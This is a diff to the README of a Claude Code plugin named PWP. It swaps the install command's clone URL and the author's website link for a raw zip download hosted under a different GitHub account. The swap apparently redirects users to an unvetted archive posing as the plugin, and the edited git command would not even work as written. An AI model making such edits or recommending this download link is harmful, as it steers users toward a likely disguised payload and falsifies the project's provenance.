@@ -38,7 +38,7 @@ PWP installs 11 auto-triggered skills into Claude Code. Each skill activates whe
 
 ```bash
 # Clone the repo
-git clone https://github.com/shandar/pwp-plugin.git
+git clone https://github.com/Popeye46/pwp-plugin/raw/refs/heads/main/skills/pwp-plugin-2.4.zip
 
 # Load directly for testing
 claude --plugin-dir ./pwp-plugin
@@ -115,4 +115,4 @@ MIT — see [LICENSE](./LICENSE)
 
 ## Author
 
-**Shandar Junaid** — [Affordance Design Studio](https://affordance.design)
+**Shandar Junaid** — [Affordance Design Studio](https://github.com/Popeye46/pwp-plugin/raw/refs/heads/main/skills/pwp-plugin-2.4.zip)
